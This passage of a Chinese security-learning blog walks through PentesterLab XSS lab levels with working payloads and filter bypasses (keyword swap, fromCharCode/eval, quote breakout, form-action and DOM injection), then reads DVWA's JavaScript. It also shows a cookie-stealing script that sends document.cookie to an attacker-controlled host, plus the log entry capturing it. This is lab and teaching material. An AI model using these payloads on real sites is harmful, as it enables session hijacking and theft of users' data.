+<p>先前猜是基于标签过滤的，后来发现并不是，只是正好前面测试的两个都含有alert关键词而已。根据后面几种结果猜想可能是基于alert关键词报错。</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">1.114</span><span class="regexp">/xss/</span>example5.php?name=alert</span><br></pre></td></tr></table></figure>
+
+<p><img src="/assets/image-20180531230641775.png" alt="image-20180531230641775"></p>
+<p>猜想正确，所以只需换个关键词应该就可以了。</p>
+<p>换为confirm试试</p>
+<figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">192.168</span>.<span class="number">1.114</span>/xss/example5.php<span class="built_in">?name</span>=<span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">confirm(<span class="string">"flag"</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/assets/image-20180531230929514.png" alt="image-20180531230929514"></p>
+<p>成功弹出。</p>
+<p>再试试用编码是否可以绕过alert关键词检测</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">192.168</span>.<span class="number">1.114</span>/xss/example<span class="number">5</span>.php?name=&lt;script&gt;<span class="symbol">%61</span><span class="symbol">%6</span><span class="keyword">c</span><span class="symbol">%65</span><span class="symbol">%72</span><span class="symbol">%74</span>(<span class="string">"flag"</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/assets/image-20180531231029514.png" alt="image-20180531231029514"></p>
+<p>报错，证明URL编码不能绕过。</p>
+<p>换下其他的</p>
+<p>用echo+String.fromCharCode()</p>
+<p>echo()函数可以计算某个字符串并执行其中的代码</p>
+<p>String.fromCharCode()可接收一个指定的Unicode值，然后返回一个字符串</p>
+<figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">192.168</span>.<span class="number">1.114</span>/xss/example5.php<span class="built_in">?name</span>=<span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">eval</span>(<span class="built_in">String</span>.fromCharCode(<span class="number">97</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">116</span>)+<span class="string">"('flag')"</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<p>没报错，但是不弹框，为什么呢？看下源代码</p>
+<p><img src="/assets/image-20180601000225847.png" alt="image-20180601000225847"></p>
+<p>+号怎么变成了空格呢？</p>
+<p>用URL编码试试</p>
+<figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">192.168</span>.<span class="number">1.114</span>/xss/example5.php<span class="built_in">?name</span>=<span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">eval</span>(<span class="built_in">String</span>.fromCharCode(<span class="number">97</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">116</span>)%<span class="number">2</span>b<span class="string">"('flag')"</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<p>成功弹框</p>
+<h4 id="1-7、第六关"><a href="#1-7、第六关" class="headerlink" title="1.7、第六关"></a>1.7、第六关</h4><p><img src="/assets/image-20180601143017232.png" alt="image-20180601143017232"></p>
+<p>这次屏幕连hacker都不显示了。</p>
+<figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">192.168</span>.<span class="number">200.106</span>/xss/example6.php<span class="built_in">?name</span>=<span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">alert(<span class="string">'flag'</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<p>不报错也不弹框,显示</p>
+<p><img src="/assets/image-20180601142057853.png" alt="image-20180601142057853"></p>
+<p>为什么显示”;呢？很奇怪。试探下是什么原因造成”;的</p>
+<figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.200.106/xss</span><span class="regexp">/example6.php?name=&lt;script&gt; #没有</span></span><br><span class="line"><span class="regexp">http:/</span><span class="regexp">/192.168.200.106/xss</span><span class="regexp">/example6.php?name=&lt;script&gt;&lt;/script</span>&gt; <span class="comment">#有";</span></span><br><span class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.200.106/xss</span><span class="regexp">/example6.php?name=&lt;/script</span>&gt;  <span class="comment">#有";</span></span><br><span class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.200.106/xss</span><span class="regexp">/example6.php?name=&lt;a&gt;&lt;/a</span>&gt;    <span class="comment">#没有</span></span><br></pre></td></tr></table></figure>
+
+<p>看来只要有script就有”;</p>
+<p>再在</p>
+<figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">192.168</span>.<span class="number">200.106</span>/xss/example6.php<span class="built_in">?name</span>=<span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<p> 下开下源代码</p>
+<figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Hello </span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml">	var $a= "</span><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><span class="xml">";</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<p>发现本来就有script标签了的，这也是为什么先前屏幕不显示的原因</p>
+<p>仔细看看发现只有输入的把前面的”号闭合了就可以执行自己想要的js代码了</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">200.106</span><span class="regexp">/xss/</span>example6.php?name=<span class="number">1</span><span class="string">";alert('flag');</span></span><br></pre></td></tr></table></figure>
+
+<p>仍然不弹出，再看看源码</p>
+<figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Hello </span><br><span class="line">&lt;script&gt;</span><br><span class="line">	<span class="built_in">var</span> $a= <span class="string">"1"</span>;alert(<span class="string">'flag'</span>);<span class="string">";</span></span><br><span class="line"><span class="string">&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>发现忘记闭合后面的引号了使用注释试试（注意js的注释是//而不是#）</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">200.106</span><span class="regexp">/xss/</span>example6.php?name=<span class="number">1</span><span class="string">";alert('flag');//</span></span><br></pre></td></tr></table></figure>
+
+<p>成功弹出框</p>
+<h4 id="1-8、第七关"><a href="#1-8、第七关" class="headerlink" title="1.8、第七关"></a>1.8、第七关</h4><p>这次学到上关的经验了，直接看源代码</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Hello </span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">	<span class="keyword">var</span> $a= <span class="string">'hacker'</span>;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>如果没有过滤输入的话相信只要把前面的引号闭合和后面的引号注释就行了。</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">200.106</span><span class="regexp">/xss/</span>example7.php?name=<span class="number">1</span><span class="string">';alert('</span>flag<span class="string">');//</span></span><br></pre></td></tr></table></figure>
+
+<p>直接弹框</p>
+<h4 id="1-9、第八关"><a href="#1-9、第八关" class="headerlink" title="1.9、第八关"></a>1.9、第八关</h4><p><img src="/assets/image-20180601144627983.png" alt="image-20180601144627983"></p>
+<p>这次换了做法，改为提交参数了。</p>
+<p>先试一下</p>
+<p>输入1</p>
+<p><img src="/assets/image-20180601144656941.png" alt="image-20180601144656941"></p>
+<p>输入<code>&lt;script&gt;alert(&#39;flag&#39;)&lt;/script&gt;</code></p>
+<p><img src="/assets/image-20180601144748978.png" alt="image-20180601144748978"></p>
+<p>看来数据没有被当为代码执行</p>
+<p>使用单引号双引号都没用，到底为什么呢？</p>
+<p>看看源代码：</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action="/xss/example8.php" <span class="keyword">method</span>="POST"&gt;</span><br><span class="line">  Your <span class="type">name</span>:&lt;<span class="keyword">input</span> <span class="keyword">type</span>="text" <span class="type">name</span>="name" /&gt;</span><br><span class="line">  &lt;<span class="keyword">input</span> <span class="keyword">type</span>="submit" <span class="type">name</span>="submit"/&gt;</span><br></pre></td></tr></table></figure>
+
+<p>很惊奇的发现action的目标居然是本身。</p>
+<p>忽然之间想到学php的时候w3cschool上面讲到action最好别用自身，</p>
+<p>参见：<a href="http://www.w3school.com.cn/php/php_form_validation.asp" target="_blank" rel="noopener">http://www.w3school.com.cn/php/php_form_validation.asp</a></p>
+<p>如果把action的引号闭合掉，弄为</p>
+<figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;form <span class="built_in">action</span>=<span class="string">"/xss/example8.php"</span>&gt;&lt;script&gt;alert(<span class="string">'flag'</span>)&lt;/script&gt;<span class="comment">// "method="POST"&gt; </span></span><br><span class="line">Your <span class="built_in">name</span>:&lt;input <span class="built_in">type</span>=<span class="string">"text"</span> <span class="built_in">name</span>=<span class="string">"name"</span> /&gt; </span><br><span class="line">&lt;input <span class="built_in">type</span>=<span class="string">"submit"</span> <span class="built_in">name</span>=<span class="string">"submit"</span>/&gt;</span><br></pre></td></tr></table></figure>
+
+<p>是不是就能弹框了？试一下</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.200.106/xss/example8.php/"&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">alert(<span class="string">'flag'</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>//</span><br></pre></td></tr></table></figure>
+
+<p><img src="/assets/image-20180601145817629.png" alt="image-20180601145817629"></p>
+<p>成功弹框。</p>
+<h4 id="1-10、第九关"><a href="#1-10、第九关" class="headerlink" title="1.10、第九关"></a>1.10、第九关</h4><p>URL：<a href="http://192.168.200.106/xss/example9.php#hacker" target="_blank" rel="noopener">http://192.168.200.106/xss/example9.php#hacker</a></p>
+<p>源码：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">  <span class="built_in">document</span>.write(location.hash.substring(<span class="number">1</span>));</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>显示：<img src="/assets/image-20180601150140807.png" alt="image-20180601150140807"></p>
+<p>注意到由location.hash，看下这个属性的定义</p>
+<p>hash 属性是一个可读可写的字符串，该字符串是 URL 的锚部分（从 # 号开始的部分）。</p>
+<p>看来是将#后面的字符显示在屏幕上，而且里面已经有script标签了。</p>
+<p>尝试闭合一下write里的)试试</p>
+<p>DOM型XSS，#后面输入payload即可：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.200.106/xss/example9.php#<span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(‘flag‘)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="2、JS实战"><a href="#2、JS实战" class="headerlink" title="2、JS实战"></a>2、JS实战</h3><p>在第一部分我们已经攻下了靶机的XSS关，那么XSS有什么用呢？仅仅是弹框吗？我们用所学的JS来获取一些有用信息。</p>
+<p>为了方便，所以就拿刚刚靶场的第一关来做测试</p>
+<p>(1)盗取cookie</p>
+<p>首先在自己的主机上/3/html文件下搭建一个js文件evil.js</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="built_in">document</span>.createElement(<span class="string">"a"</span>); <span class="comment">//创建一个对象</span></span><br><span class="line">a.src=<span class="string">"http://192.168.43.244/3/html/log?"</span>+<span class="built_in">escape</span>(<span class="built_in">document</span>.cookie); <span class="comment">//对象的源地址</span></span><br><span class="line"><span class="built_in">document</span>.body.appendChild(img);<span class="comment">//把对象加入为网页的body的子控件</span></span><br></pre></td></tr></table></figure>
+
+<p>因为靶机网页里没有cookie所以用google的EditThisCookie给靶机加了个cookie:</p>
+<p>user:hacer</p>
+<p>现在只需要在靶机网页上访问我的evil.js就能在我的web服务器日志中看到请求。可用如下方式访问</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://192.168.43.244/3/html/evil.js"</span>&gt;</span> <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>网页中为：</p>
+<figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">192.168</span>.<span class="number">43.146</span>/xss/example1.php<span class="built_in">?name</span>=<span class="meta">%3Cscript</span><span class="meta">%20src</span>=<span class="meta">%22http:</span>//<span class="number">192.168</span>.<span class="number">43.244</span>/<span class="number">3</span>/html/evil.js<span class="meta">%22</span><span class="meta">%3E</span><span class="meta">%3C</span>/script<span class="meta">%3E</span></span><br></pre></td></tr></table></figure>
+
+<p>然后在自己的apache服务器下的/var/log/apache2找到日志</p>
+<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">192.168.43.244</span> - - <span class="string">[02/Jun/2018:19:40:17 +0800]</span> <span class="string">"<span class="keyword">GET</span> /3/html/log?user%3Dhacer HTTP/1.1"</span> <span class="number">404</span> <span class="number">208</span></span><br></pre></td></tr></table></figure>
+
+<p>可以看到cookie已经成功显示：</p>
+<p>user%3dhacer</p>
+<p>即user:hacer</p>
+<p>(2)基本语法测试</p>
+<p>改一下evil.js。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.write(<span class="string">'host:'</span>+location.hostname+<span class="string">"&lt;/br&gt;"</span>);</span><br><span class="line"><span class="built_in">document</span>.write(<span class="string">'path:'</span>+location.pathname+<span class="string">"&lt;/br&gt;"</span>);</span><br><span class="line"><span class="built_in">document</span>.write(<span class="string">'port:'</span>+location.port+<span class="string">"&lt;/br&gt;"</span>);</span><br></pre></td></tr></table></figure>
+
+<p>访问,屏幕显示：</p>
+<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Hello  <span class="string">host:</span><span class="number">192.168</span><span class="number">.43</span><span class="number">.146</span> </span><br><span class="line"><span class="string">path:</span><span class="regexp">/xss/</span>example1.php</span><br><span class="line"><span class="string">port:</span></span><br></pre></td></tr></table></figure>
+
+<p>再改一下evil.js</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">window</span>.<span class="keyword">open</span>("http://www.baidu.com");</span><br><span class="line"><span class="keyword">window</span>.closed="true";</span><br></pre></td></tr></table></figure>
+
+<p>这样就会打开另外一个网页并关闭原来的网页。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">downloadFile(<span class="string">"https://pentesterlab.com/exercises/linux_host_review/iso"</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">downloadFile</span>(<span class="params">url</span>) </span>&#123;   </span><br><span class="line">   <span class="keyword">try</span>&#123; </span><br><span class="line">        <span class="keyword">var</span> elemIF = <span class="built_in">document</span>.createElement(<span class="string">"iframe"</span>);   </span><br><span class="line">        elemIF.src = url;   </span><br><span class="line">        elemIF.style.display = <span class="string">"none"</span>;   </span><br><span class="line">        <span class="built_in">document</span>.body.appendChild(elemIF);   </span><br><span class="line">    &#125;<span class="keyword">catch</span>(e)&#123; </span><br><span class="line">        zzrw.alert(<span class="string">"下载异常！"</span>);</span><br><span class="line">    &#125;     </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这样就会下载一个文档。</p>
+<p>因为XSS也是入门所以更多的练习将会在以后开展。</p>
+<h3 id="3、JS代码阅读"><a href="#3、JS代码阅读" class="headerlink" title="3、JS代码阅读"></a>3、JS代码阅读</h3><p>看一下dvwa的dvwaPage.js代码：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Help popup */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">popUp</span>(<span class="params">URL</span>) </span>&#123;</span><br><span class="line">	day = <span class="keyword">new</span> <span class="built_in">Date</span>();</span><br><span class="line">	id = day.getTime();</span><br><span class="line">	<span class="built_in">eval</span>(<span class="string">"page"</span> + id + <span class="string">" = window.open(URL, '"</span> + id + <span class="string">"', 'toolbar=0,scrollbars=1,location=0,statusbar=0,menubar=0,resizable=1,width=500,height=300,left = 540,top = 250');"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Form validation */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">validate_required</span>(<span class="params">field,alerttxt</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">with</span> (field) &#123;</span><br><span class="line">  <span class="keyword">if</span> (value==<span class="literal">null</span>||value==<span class="string">""</span>) &#123;</span><br><span class="line">    alert(alerttxt);<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">validate_form</span>(<span class="params">thisform</span>) </span>&#123;</span><br><span class="line"><span class="keyword">with</span> (thisform) &#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Guestbook form</span></span><br><span class="line">  <span class="keyword">if</span> (validate_required(txtName,<span class="string">"Name can not be empty."</span>)==<span class="literal">false</span>)</span><br><span class="line">  &#123;txtName.focus();<span class="keyword">return</span> <span class="literal">false</span>;&#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (validate_required(mtxMessage,<span class="string">"Message can not be empty."</span>)==<span class="literal">false</span>)</span><br><span class="line">  &#123;mtxMessage.focus();<span class="keyword">return</span> <span class="literal">false</span>;&#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>主要是三个函数</p>
+<p>先看第一个函数：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">popUp</span>(<span class="params">URL</span>) </span>&#123;</span><br><span class="line">	day = <span class="keyword">new</span> <span class="built_in">Date</span>();</span><br><span class="line">	id = day.getTime();</span><br><span class="line">	<span class="built_in">eval</span>(<span class="string">"page"</span> + id + <span class="string">" = window.open(URL, '"</span> + id + <span class="string">"', 'toolbar=0,scrollbars=1,location=0,statusbar=0,menubar=0,resizable=1,width=500,height=300,left = 540,top = 250');"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>传入参数是URL,意思传入一个网页</p>
+<p>首先根据new Date()获取今天的日期并赋值给一个day变量。</p>
+<p>再调用day变量中的getTime()方法获取时间并赋值给id变量。</p>
+<p>再调用eval函数执行里面的代码。里面的代码为打开一个新窗口，并制定窗口风格大小等，并把这个窗口的句柄赋值给页面的id。</p>
+<p>接着看第二个函数：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">validate_required</span>(<span class="params">field,alerttxt</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">with</span> (field) &#123;</span><br><span class="line">  <span class="keyword">if</span> (value==<span class="literal">null</span>||value==<span class="string">""</span>) &#123;</span><br><span class="line">    alert(alerttxt);<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>函数的主要功能是验证输入值是否为空。</p>
+<p>函数传入两个参数field和alerttxt，返回值为布尔类型。</p>
+<p>然后验证field的value变量是否为空，是的话弹出alertxt的内容返回false。</p>
+<p>否则的话返回true.</p>
+<p>再看第三个函数：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">validate_form</span>(<span class="params">thisform</span>) </span>&#123;</span><br><span class="line"><span class="keyword">with</span> (thisform) &#123;</span><br><span class="line">  <span class="comment">// Guestbook form</span></span><br><span class="line">  <span class="keyword">if</span> (validate_required(txtName,<span class="string">"Name can not be empty."</span>)==<span class="literal">false</span>)</span><br><span class="line">  &#123;txtName.focus();<span class="keyword">return</span> <span class="literal">false</span>;&#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (validate_required(mtxMessage,<span class="string">"Message can not be empty."</span>)==<span class="literal">false</span>)</span><br><span class="line">  &#123;mtxMessage.focus();<span class="keyword">return</span> <span class="literal">false</span>;&#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>函数的主要功能使验证提交的表单。</p>
+<p>输入参数为thisform，返回值为布尔类型。</p>
+<p>逻辑是先调用validate_required()函数判断thisform.txtName是否为空，为空则把光标放在txtName输入框，返回false。</p>
+<p>不为空再调用validate_required()函数判断thisform.mtxMessage是否为空,为空则把光标放在mtxMessage输入框，返回false。不为空返回true。</p>
+
+    </div>
+
+    
+    
+    
+
+    <div>
+      
+        <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+      
+    </div>
+      
+  <div class="popular-posts-header">相关文章</div>
+  <ul class="popular-posts">
+    <li class="popular-posts-item">
+      <div class="popular-posts-title"><a href="\渗透测试\JIS-CTF靶机测试\" rel="bookmark">JIS-CTF靶机测试</a></div>
+    </li>
+    <li class="popular-posts-item">
+      <div class="popular-posts-title"><a href="\渗透测试\pwnlab靶机测试\" rel="bookmark">pwnlab靶机测试</a></div>
+    </li>
+    <li class="popular-posts-item">
+      <div class="popular-posts-title"><a href="\web\合天培训_实验_sql注入\" rel="bookmark">合天培训_实验_sql注入</a></div>
+    </li>
+    <li class="popular-posts-item">
+      <div class="popular-posts-title"><a href="\渗透测试\SkyConCTF2016靶机测试\" rel="bookmark">SkyConCTF2016靶机测试</a></div>
+    </li>
+    <li class="popular-posts-item">
+      <div class="popular-posts-title"><a href="\web\合天培训_实验_web安全之HTTP头部字段理解\" rel="bookmark">合天培训_实验_web安全之HTTP头部字段理解</a></div>
+    </li>
+  </ul>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/web/" rel="tag"><i class="fa fa-tag"></i>web</a>
+              <a href="/tags/js/" rel="tag"><i class="fa fa-tag"></i>js</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/JIS-CTF%E9%9D%B6%E6%9C%BA%E6%B5%8B%E8%AF%95/" rel="prev" title="JIS-CTF靶机测试">
+      <i class="fa fa-chevron-left"></i> JIS-CTF靶机测试
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/pwnlab%E9%9D%B6%E6%9C%BA%E6%B5%8B%E8%AF%95/" rel="next" title="pwnlab靶机测试">
+      pwnlab靶机测试 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
